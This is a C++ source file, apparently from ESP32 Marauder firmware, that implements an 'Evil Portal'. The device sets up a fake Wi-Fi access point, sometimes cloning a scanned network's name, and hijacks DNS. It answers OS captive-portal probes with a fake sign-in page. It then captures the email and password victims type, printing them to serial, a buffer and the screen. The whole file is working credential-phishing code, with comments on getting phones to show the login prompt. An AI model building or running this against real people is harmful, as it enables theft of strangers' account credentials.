#include "EvilPortal.h"

char apName[MAX_AP_NAME_SIZE] = "PORTAL";

char* index_html = nullptr;

namespace {
bool replacePortalHtml(const char* html, size_t length) {
  if (!html || length >= MAX_HTML_SIZE) return false;

  #ifdef HAS_PSRAM
    char* replacement = static_cast<char*>(ps_malloc(length + 1));
  #else
    char* replacement = static_cast<char*>(malloc(length + 1));
  #endif
  if (!replacement) return false;

  memcpy(replacement, html, length);
  replacement[length] = '\0';
  free(index_html);
  index_html = replacement;
  return true;
}
}

// Native ESP-IDF HTTP server. The ESP32-C5 does not accept connections through
// AsyncTCP/ESPAsyncWebServer (the phone associates but every request is
// refused), which is why the captive portal never served. The working v1.16.0
// V8 firmware uses esp_http_server, so we do too.
static httpd_handle_t evil_portal_httpd = nullptr;

extern EvilPortal evil_portal_obj;

namespace {

// Minimal application/x-www-form-urlencoded value decoder (%XX and '+').
String portalUrlDecode(const char* src) {
  String out;
  if (src == nullptr) return out;
  for (size_t i = 0; src[i] != '\0'; i++) {
    char c = src[i];
    if (c == '+') {
      out += ' ';
    } else if (c == '%' && src[i + 1] && src[i + 2]) {
      auto hex = [](char h) -> int {
        if (h >= '0' && h <= '9') return h - '0';
        if (h >= 'a' && h <= 'f') return h - 'a' + 10;
        if (h >= 'A' && h <= 'F') return h - 'A' + 10;
        return -1;
      };
      int hi = hex(src[i + 1]), lo = hex(src[i + 2]);
      if (hi >= 0 && lo >= 0) {
        out += static_cast<char>((hi << 4) | lo);
        i += 2;
      } else {
        out += c;
      }
    } else {
      out += c;
    }
  }
  return out;
}

esp_err_t portalSendHtml(httpd_req_t* req) {
  httpd_resp_set_type(req, "text/html");
  if (index_html != nullptr)
    return httpd_resp_send(req, index_html, HTTPD_RESP_USE_STRLEN);
  return httpd_resp_send(req, "", 0);
}

// Root + any captive-detection path (served via the 404 fallback) returns the
// portal HTML, which triggers the client's captive-portal detection.
esp_err_t portalRootHandler(httpd_req_t* req) {
  return portalSendHtml(req);
}

esp_err_t portalCatchAll(httpd_req_t* req, httpd_err_code_t error) {
  httpd_resp_set_status(req, "200 OK");
  return portalSendHtml(req);
}

esp_err_t portalApNameHandler(httpd_req_t* req) {
  httpd_resp_set_type(req, "text/plain");
  String ssid = WiFi.softAPSSID();
  return httpd_resp_send(req, ssid.c_str(), HTTPD_RESP_USE_STRLEN);
}

// Captured credentials arrive as /get?email=...&password=...
esp_err_t portalGetHandler(httpd_req_t* req) {
  size_t qlen = httpd_req_get_url_query_len(req) + 1;
  if (qlen > 1) {
    char* query = static_cast<char*>(malloc(qlen));
    if (query != nullptr) {
      if (httpd_req_get_url_query_str(req, query, qlen) == ESP_OK) {
        char value[160];
        if (httpd_query_key_value(query, "email", value, sizeof(value)) == ESP_OK)
          evil_portal_obj.onCredentialField(true, portalUrlDecode(value));
        if (httpd_query_key_value(query, "password", value, sizeof(value)) == ESP_OK)
          evil_portal_obj.onCredentialField(false, portalUrlDecode(value));
      }
      free(query);
    }
  }
  httpd_resp_set_type(req, "text/html");
  const char* redirect =
      "<html><head><script>setTimeout(() => { window.location.href='/' }, 100);"
      "</script></head><body></body></html>";
  return httpd_resp_send(req, redirect, HTTPD_RESP_USE_STRLEN);
}

}  // namespace

void EvilPortal::onCredentialField(bool is_email, const String& value) {
  if (is_email) {
    this->user_name = value;
    this->name_received = true;
  } else {
    this->password = value;
    this->password_received = true;
  }
}

void EvilPortal::setup() {
  this->runServer = false;
  this->name_received = false;
  this->password_received = false;
  this->has_html = false;
  this->has_ap = false;

  html_files = new LinkedList<String>();

  #ifdef HAS_SD
    if (sd_obj.supported) {
      sd_obj.listDirToLinkedList(html_files, "/", "html");

      #ifndef MARAUDER_V8
        Serial.println("Evil Portal Found " + (String)html_files->size() + " HTML files");
      #endif
    }
  #endif
}

void EvilPortal::cleanup() {
  // Only tear the HTTP server / DNS down if THIS object actually started them.
  // cleanup() is called from every StopScan, not just Evil Portal's, so guard on
  // runServer to avoid touching network state on unrelated scans. httpd_stop()
  // here (while lwIP is still up -- StopScan calls cleanup() before
  // shutdownWiFi()) closes the listening socket so the next activation's
  // httpd_start() binds cleanly. AP/radio teardown is left to shutdownWiFi().
  const bool portal_was_running = this->runServer;
  this->runServer = false;
  this->ap_index = -1;

  if (portal_was_running) {
    // Stop the HTTP server first (while the AP netif / lwIP are still up) so its
    // listening socket closes cleanly, then the DNS server.
    this->dnsServer.stop();
    if (evil_portal_httpd != nullptr) {
      httpd_stop(evil_portal_httpd);
      evil_portal_httpd = nullptr;
    }
    // Tear down the softAP through Arduino, exactly as stock Marauder's Evil
    // Portal does. This releases the AP netif + DHCP pool and cleanly deinits
    // the radio, which is what lets the NEXT scan receive again -- without it
    // the softAP lingered and promiscuous RX stayed dead ("Scan AP shows
    // nothing after an Evil Portal"). Stock pairs this same call with the
    // esp_wifi_init(&cfg) in RunEvilPortal, so the next portal re-creates the AP
    // normally.
    WiFi.softAPdisconnect(true);
  }

  free(index_html);
  index_html = nullptr;
  this->has_html = false;
  this->using_serial_html = false;
}

bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  if (!this->has_ap) {
    if (!this->setAP(ssids, access_points))
      return false;
  }
  if (!this->setHtml())
    return false;
    
  startPortal();

  return true;
}

String EvilPortal::get_user_name() {
  return this->user_name;
}

String EvilPortal::get_password() {
  return this->password;
}

void EvilPortal::setupServer() {
  // Start (or restart) the native HTTP server on a fresh socket each activation.
  if (evil_portal_httpd != nullptr) {
    httpd_stop(evil_portal_httpd);
    evil_portal_httpd = nullptr;
  }

  httpd_config_t config = HTTPD_DEFAULT_CONFIG();
  config.server_port = 80;
  config.ctrl_port = 32768;
  config.lru_purge_enable = true;
  config.max_uri_handlers = 8;
  config.stack_size = 4096;  // default; keep the httpd task's internal heap small
  config.max_open_sockets = 4;

  if (httpd_start(&evil_portal_httpd, &config) != ESP_OK) {
    evil_portal_httpd = nullptr;
    #ifndef MARAUDER_V8
      Serial.println(F("Evil Portal: httpd_start failed"));
    #endif
    return;
  }

  httpd_uri_t root_uri = {};
  root_uri.uri = "/";
  root_uri.method = HTTP_GET;
  root_uri.handler = portalRootHandler;
  httpd_register_uri_handler(evil_portal_httpd, &root_uri);

  httpd_uri_t get_uri = {};
  get_uri.uri = "/get";
  get_uri.method = HTTP_GET;
  get_uri.handler = portalGetHandler;
  httpd_register_uri_handler(evil_portal_httpd, &get_uri);

  httpd_uri_t apname_uri = {};
  apname_uri.uri = "/get-ap-name";
  apname_uri.method = HTTP_GET;
  apname_uri.handler = portalApNameHandler;
  httpd_register_uri_handler(evil_portal_httpd, &apname_uri);

  // Every other path (the OS captive-detection probes: /generate_204,
  // /hotspot-detect.html, /ncsi.txt, ...) is unregistered and so lands on the
  // 404 handler, which answers 200 + the portal HTML. That mismatch is what
  // makes the phone pop the "Sign in" page.
  httpd_register_err_handler(evil_portal_httpd, HTTPD_404_NOT_FOUND, portalCatchAll);
}

void EvilPortal::setHtmlFromSerial() {
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML from serial..."));
  #endif
  const String html = Serial.readString();
  if (!replacePortalHtml(html.c_str(), html.length())) {
    Serial.println(F("Unable to allocate HTML buffer"));
    return;
  }
  this->has_html = true;
  this->using_serial_html = true;
  #ifndef MARAUDER_V8
    Serial.println("html set");
  #endif
}

bool EvilPortal::setHtml() {
  if (this->using_serial_html) {
    #ifndef MARAUDER_V8
      Serial.println(F("html previously set"));
    #endif
    return true;
  }
  #ifndef MARAUDER_V8
    Serial.println(F("Setting HTML..."));
  #endif
  #ifdef HAS_SD
    File html_file = sd_obj.getFile("/" + this->target_html_name);
  #else
    File html_file;
  #endif
  if (!html_file) {
    #ifdef HAS_SCREEN
      this->sendToDisplay("Could not find /" + this->target_html_name);
      this->sendToDisplay(F("Touch to exit..."));
    #endif
    #ifndef MARAUDER_V8
      Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
    #endif
    return false;
  }
  else {
    if (html_file.size() > MAX_HTML_SIZE) {
      #ifdef HAS_SCREEN
        this->sendToDisplay(F("The given HTML is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided HTML is too large.\nUse stopscan...");
      #endif
      return false;
    }
    String html = "";
    while (html_file.available()) {
      char c = html_file.read();
      if (isPrintable(c))
        html.concat(c);
    }
    if (!replacePortalHtml(html.c_str(), html.length())) {
      html_file.close();
      #ifndef MARAUDER_V8
        Serial.println(F("Unable to allocate HTML buffer"));
      #endif
      return false;
    }
    this->has_html = true;
    #ifndef MARAUDER_V8
      Serial.println("html set");
    #endif
    html_file.close();
    return true;
  }

}

bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
  // See if there are selected APs first
  int targ_ap_index = -1;
  String ap_config = "";
  String temp_ap_name = "";
  for (int i = 0; i < access_points->size(); i++) {
    if (access_points->get(i).selected) {
      temp_ap_name = access_points->get(i).essid;
      targ_ap_index = i;
      break;
    }
  }
  // If there are no SSIDs and there are no APs selected, pull from file
  // This means the file is last resort
  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
    return this->setAPFromConfig();
  }
  // There are SSIDs in the list but there could also be an AP selected
  // Priority is SSID list before AP selected and config file
  else if (ssids->size() > 0) {
    ap_config = ssids->get(0).essid;
    if (ap_config.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The provided AP name is too large.\nUse stopscan...");
      #endif
      return false;
    }
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("AP name from SSID list"));
      this->sendToDisplay("AP name: " + ap_config);
    #endif
    #ifndef MARAUDER_V8
      Serial.println("AP name from SSID list: " + ap_config);
    #endif
  }
  else if (temp_ap_name != "") {
    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("The given AP name is too large. Touch to exit..."));
      #endif
      #ifndef MARAUDER_V8
        Serial.println("The given AP name is too large.\nUse stopscan...");
      #endif
    }
    else {
      ap_config = temp_ap_name;
      #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
        this->sendToDisplay(F("AP name from AP list"));
        this->sendToDisplay("AP name: " + ap_config);
      #endif
      #ifndef MARAUDER_V8
        Serial.println("AP name from AP list: " + ap_config);
      #endif
    }
  }
  else {
    #ifndef MARAUDER_V8
      Serial.println(F("Could not configure Access Point. Use stopscan..."));
    #endif
    #if defined(HAS_SCREEN) && !defined(MARAUDER_V8)
      this->sendToDisplay(F("Could not configure Access Point.\nTouch to exit..."));
    #endif
  }

  if (ap_config != "") {
    strncpy(apName, ap_config.c_str(), MAX_AP_NAME_SIZE);
    this->has_ap = true;
    #ifndef MARAUDER_V8
      Serial.println(F("ap config set"));
    #endif
    this->ap_index = targ_ap_index;
    return true;
  }
  else
    return false;

}

bool EvilPortal::setAPFromConfig() {
  #ifdef HAS_SD
    File ap_config_file = sd_obj.getFile("/ap.config.txt");
  #else
    File ap_config_file;
  #endif

  if (!ap_config_file || ap_config_file.size() > MAX_AP_NAME_SIZE) {
    if (ap_config_file)
      ap_config_file.close();
    return false;
  }

  String ap_config = ap_config_file.readString();
  ap_config_file.close();

  if (this->setAP(ap_config)) {
    this->ap_index = -1;
    return true;
  }

  return false;
}

bool EvilPortal::setAP(String essid) {
  if (essid == "")
    return false;

  if (essid.length() > MAX_AP_NAME_SIZE) {
    return false;
  }

  strncpy(apName, essid.c_str(), MAX_AP_NAME_SIZE - 1);
  apName[MAX_AP_NAME_SIZE - 1] = '\0';
  this->has_ap = true;
  #ifndef MARAUDER_V8
    Serial.println(F("ap config set"));
  #endif
  return true;
}

void EvilPortal::startAP() {
  const IPAddress AP_IP(172, 0, 0, 1);

  // Bring the softAP up, retrying a few times. After a long/dense AP scan the
  // internal (DMA) heap can be fragmented, or the previous mode's radio teardown
  // may not have fully settled, so the first WiFi.softAP() intermittently fails
  // and the SSID never broadcasts ("sometimes it works, sometimes it doesn't",
  // worse on the Mini V3 with its smaller internal-heap headroom). A short settle
  // + retry brings it up reliably. On the healthy path (e.g. the V8) it comes up
  // on the first attempt and the rest of the loop never runs.
  bool up = false;
  for (int attempt = 0; attempt < 4; attempt++) {
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
    up = WiFi.softAP(apName);
    if (up && WiFi.softAPIP() != IPAddress(0, 0, 0, 0))
      break;
    // Failed to come up: drop the half-started AP and let the radio settle.
    WiFi.softAPdisconnect(true);
    delay(200);
  }

  #ifndef MARAUDER_V8
    Serial.print(F("ap ip address: "));
    Serial.println(WiFi.softAPIP());
  #endif
  #ifdef HAS_SCREEN
    if (!up || WiFi.softAPIP() == IPAddress(0, 0, 0, 0))
      this->sendToDisplay(F("SoftAP failed to start -- stopscan and retry"));
  #endif

  // Start the native HTTP server fresh on the just-created AP. (Done every
  // activation because cleanup() stops it; esp_http_server binds its own socket
  // so this reliably accepts connections on the ESP32-C5, unlike AsyncTCP.)
  this->setupServer();

  this->dnsServer.start(53, "*", WiFi.softAPIP());
  #ifndef MARAUDER_V8
    Serial.println(F("Evil Portal READY"));
  #endif
  #ifdef HAS_SCREEN
    this->sendToDisplay(F("Evil Portal READY"));
  #endif
}

void EvilPortal::startPortal() {
  // wait for flipper input to get config index
  this->startAP();

  this->runServer = true;
}

void EvilPortal::sendToDisplay(String msg) {
  #ifdef HAS_SCREEN
    String display_string = "";
    display_string.concat(msg);
    int temp_len = display_string.length();
    for (int i = 0; i < 40 - temp_len; i++)
    {
      display_string.concat(" ");
    }
    display_obj.loading = true;
    // Portal HTML lives in internal heap on no-PSRAM targets and can put the
    // general allocation guard into pressure mode. Keep these bounded status
    // and credential lines visible while still respecting queue backpressure.
    display_obj.queueCriticalLine(display_string);
    display_obj.loading = false;
  #endif
}

void EvilPortal::main(uint8_t scan_mode) {
  if (scan_mode != WIFI_SCAN_EVIL_PORTAL || !this->has_ap || !this->has_html) {
    return;
  }

  this->dnsServer.processNextRequest();

  if (this->name_received && this->password_received) {
    this->name_received = false;
    this->password_received = false;

    // Adjust size depending on your max username/password length
    char line[96];

    // If user_name / password are still Arduino String:
    snprintf(line, sizeof(line),
             "u: %s p: %s\n",
             this->user_name.c_str(),
             this->password.c_str());

    Serial.print(line);
    buffer_obj.append(line);
    #ifdef HAS_SCREEN
        this->sendToDisplay(line);
    #endif
  }
}
